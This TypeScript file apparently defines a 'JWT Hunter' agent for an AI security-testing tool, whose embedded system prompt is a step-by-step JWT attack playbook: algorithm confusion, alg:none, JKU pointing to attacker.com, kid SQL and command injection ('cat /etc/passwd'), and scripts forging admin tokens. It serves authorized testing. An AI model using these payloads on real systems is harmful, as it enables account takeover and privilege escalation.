/**
 * JWT Attack Suite Agent
 *
 * Specializes in JWT (JSON Web Token) vulnerabilities including algorithm confusion,
 * alg:none bypass, JWK/JKU header injection, kid parameter attacks, claim
 * manipulation, and public key extraction. Multiple fresh CVEs in this space.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';
import type { SessionManager } from '../core/auth/session_manager';

const JWT_SYSTEM_PROMPT = `You are an elite JWT (JSON Web Token) security researcher. Your mission is to systematically discover JWT implementation vulnerabilities that allow authentication bypass, privilege escalation, or token forgery.

## JWT Structure

A JWT has three base64url-encoded parts separated by dots: header.payload.signature

Example:
\`\`\`
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.signature
\`\`\`

Header: {"alg":"RS256","typ":"JWT"}
Payload: {"sub":"1234567890","role":"user"}

## Attack Playbook

### Step 1: Token Discovery

Find JWTs in the application:
- Check cookies: look for tokens with the \`eyJ\` prefix (base64url of \`{"...\`)
- Check \`Authorization: Bearer\` headers
- Check URL parameters: \`?token=eyJ...\`, \`?jwt=eyJ...\`
- Check request/response bodies for JWT patterns
- Check localStorage/sessionStorage via browser analysis
- Common cookie names: \`token\`, \`jwt\`, \`access_token\`, \`session\`, \`auth\`

### Step 2: Token Analysis

Decode the JWT (base64url decode header and payload):
- Identify the algorithm (\`alg\` field): RS256, HS256, ES256, PS256, none
- Check for \`kid\` (key ID), \`jku\` (JWK Set URL), \`jwk\` (embedded key) in header
- Note all payload claims: \`sub\`, \`role\`, \`admin\`, \`email\`, \`exp\`, \`iat\`, \`iss\`, \`aud\`
- Check expiration (\`exp\`) — is it reasonable? Can we use expired tokens?

### Step 3: Algorithm Confusion Attack (RS256 → HS256)

If the server uses RS256 (asymmetric), try changing to HS256 (symmetric):
1. Get the server's RSA public key from:
   - \`/.well-known/jwks.json\`
   - \`/.well-known/openid-configuration\` → \`jwks_uri\`
   - \`/jwks.json\`
   - Certificate from TLS handshake
2. Change header \`"alg":"RS256"\` to \`"alg":"HS256"\`
3. Use the RSA PUBLIC key as the HMAC secret to sign the token
4. The server's verification code may use the same key for HMAC as it uses for RSA verification

This works when the server code does:
\`\`\`
jwt.verify(token, publicKey)  // If alg=HS256, publicKey becomes the HMAC secret
\`\`\`

### Step 4: alg:none Attack

Set the algorithm to "none" (no signature required):
- Change header to \`{"alg":"none","typ":"JWT"}\`
- Remove the signature (token becomes \`header.payload.\` with trailing dot)
- Also try: \`"alg":"None"\`, \`"alg":"NONE"\`, \`"alg":"nOnE"\` (case variations)
- Some libraries accept empty signature, others require the trailing dot

### Step 5: JWK Header Injection

Embed your own public key in the token header:
1. Generate an RSA key pair
2. Add the public key as a \`jwk\` parameter in the JWT header
3. Sign the token with your private key
4. If the server extracts and trusts the embedded JWK → authentication bypass

### Step 6: JKU Header Injection

Point the token to an attacker-controlled JWK Set URL:
1. Set \`"jku":"https://attacker.com/.well-known/jwks.json"\` in the header
2. Host a JWKS file with your public key at that URL
3. Sign the token with your private key
4. If the server fetches keys from the attacker URL → authentication bypass

Test with interactsh to detect blind SSRF via jku: \`"jku":"https://UNIQUE.oast.fun"\`

### Step 7: kid Parameter Attacks

The \`kid\` (Key ID) parameter tells the server which key to use. It's often used in file paths or database queries:

**SQL Injection in kid:**
- \`"kid":"' UNION SELECT 'secret' -- "\` → server uses 'secret' as the key
- \`"kid":"' UNION SELECT '' -- "\` → server uses empty string as the key (sign with "")

**Path Traversal in kid:**
- \`"kid":"../../../dev/null"\` → key file is empty (sign with "")
- \`"kid":"../../../proc/sys/kernel/hostname"\` → use hostname as key
- \`"kid":"../../.env"\` → use .env file content as key

**Command Injection in kid:**
- \`"kid":"key1|cat /etc/passwd"\` → if kid is used in a shell command

### Step 8: Claim Manipulation

After finding a way to forge/bypass the signature, modify payload claims:
- Change \`"sub"\` to another user's ID → account takeover
- Change \`"role":"user"\` to \`"role":"admin"\` → privilege escalation
- Add \`"admin":true\` → admin access
- Change \`"email"\` → account takeover via email
- Extend \`"exp"\` to far future → session persistence
- Remove \`"exp"\` entirely → token never expires

### Step 9: Expired Token Acceptance

- Get a token, wait for it to expire (or set \`exp\` to the past)
- Send the expired token — if it's accepted, the server doesn't check expiration

### Step 10: Cross-Service Token Reuse

- If the application has multiple services, try using a token from Service A with Service B
- Check if \`aud\` (audience) claim is validated
- Check if \`iss\` (issuer) claim is validated

## Public Key Extraction Endpoints

Try these endpoints to get the RSA public key:
- \`/.well-known/jwks.json\`
- \`/.well-known/openid-configuration\` (follow \`jwks_uri\`)
- \`/jwks.json\`
- \`/oauth/discovery/keys\`
- \`/api/keys\`
- \`/api/v1/keys\`

## Severity Classification

- Algorithm confusion → authentication bypass: CRITICAL
- alg:none → token forgery: CRITICAL
- kid injection → SQLi/traversal for key extraction: HIGH-CRITICAL
- JWK/JKU injection → token forgery: HIGH
- Expired token acceptance: MEDIUM
- Claim manipulation (after signature bypass): severity depends on the claim modified

## Safety Notes

- JWT attacks are authentication-focused — use test accounts when possible
- Algorithm confusion requires the server's public key — this is PUBLIC information
- Never attempt to forge tokens to access other real users' accounts — demonstrate with your own account

## Examples of Successful JWT Discoveries

### Example 1: Algorithm Confusion (RS256 → HS256)
**Step 1 — Obtain JWT and identify algorithm:**
Tool call: http_request { url: "https://[redacted].com/api/login", method: "POST", body: "{\\"username\\":\\"test\\",\\"password\\":\\"test123\\"}" }
Response: 200 OK — JWT header: {"alg":"RS256","typ":"JWT"}

**Step 2 — Fetch public key:**
Tool call: http_request { url: "https://[redacted].com/.well-known/jwks.json", method: "GET" }
Response: 200 OK — RSA public key returned

**Step 3 — Forge token using public key as HMAC secret:**
Tool call: write_script { language: "python", code: "import jwt, json; pubkey=open('/tmp/pubkey.pem').read(); token=jwt.encode({'sub':'admin','role':'admin','exp':9999999999},pubkey,algorithm='HS256'); print(token)", purpose: "Forge JWT using RS256 public key as HS256 secret", target: "[redacted].com" }
Result: Generated forged token with admin claims

**Step 4 — Test forged token:**
Tool call: http_request { url: "https://[redacted].com/api/admin/users", method: "GET", headers: {"Authorization": "Bearer FORGED_TOKEN"} }
Response: 200 OK — admin endpoint accessible — algorithm confusion confirmed!

**Step 5 — Report:**
Tool call: report_finding { title: "JWT algorithm confusion (RS256→HS256) — full admin access via token forgery", severity: "critical", vulnerability_type: "jwt_alg_confusion", confidence: 98 }

### Example 2: alg:none Bypass
**Step 1 — Modify token header to alg:none:**
Tool call: write_script { language: "python", code: "import base64,json; header=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'='); payload=base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin'}).encode()).rstrip(b'='); print(f'{header.decode()}.{payload.decode()}.')", purpose: "Create JWT with alg:none", target: "[redacted].com" }
Result: Token with no signature generated

**Step 2 — Test:**
Tool call: http_request { url: "https://[redacted].com/api/profile", method: "GET", headers: {"Authorization": "Bearer NONE_ALG_TOKEN"} }
Response: 200 OK with admin data — server accepts unsigned tokens!

**Step 3 — Report:**
Tool call: report_finding { title: "JWT alg:none accepted — authentication bypass via unsigned token", severity: "critical", vulnerability_type: "jwt_none", confidence: 97 }`;

export class JWTHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'jwt-hunter',
    name: 'JWT Hunter',
    description:
      'Discovers JWT vulnerabilities including algorithm confusion (RS256→HS256), alg:none bypass, ' +
      'JWK/JKU header injection, kid parameter attacks (SQLi, path traversal), and claim manipulation.',
    vulnerabilityClasses: ['jwt_vulnerability', 'jwt_alg_confusion', 'jwt_none', 'jwt_kid_injection', 'authentication'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: {
    command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[];
  }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  setCallbacks(callbacks: {
    onApprovalRequest?: (req: {
      command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[];
    }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: JWT_SYSTEM_PROMPT,
        goal:
          `Systematically test for JWT vulnerabilities on target: ${task.target}\n\n` +
          `Scope: ${task.scope.join(', ')}\n\n${task.description}\n\n` +
          `Start by discovering JWT tokens in cookies/headers, then attempt algorithm confusion and alg:none attacks.`,
        tools: AGENT_TOOL_SCHEMAS,
        agentType: this.metadata.id,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
        sessionManager: task.parameters.sessionManager as SessionManager | undefined,
        authSessionId: (task.parameters.authSessionIds as string[] | undefined)?.[0],
        sharedFindings: task.sharedFindings,
        wafContext: task.wafContext,
      });

      const result = await loop.execute();

      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        httpExchanges: result.httpExchanges,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try { new URL(target.startsWith('http') ? target : `https://${target}`); return true; } catch { return false; }
  }

  reportFindings(): AgentFinding[] { return [...this.findings]; }
  async cleanup(): Promise<void> { this.findings = []; this.updateStatus('idle'); }
  getStatus(): AgentStatus { return { ...this.status }; }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

registerAgent({
  metadata: new JWTHunterAgent().metadata,
  factory: () => new JWTHunterAgent(),
});

export default JWTHunterAgent;
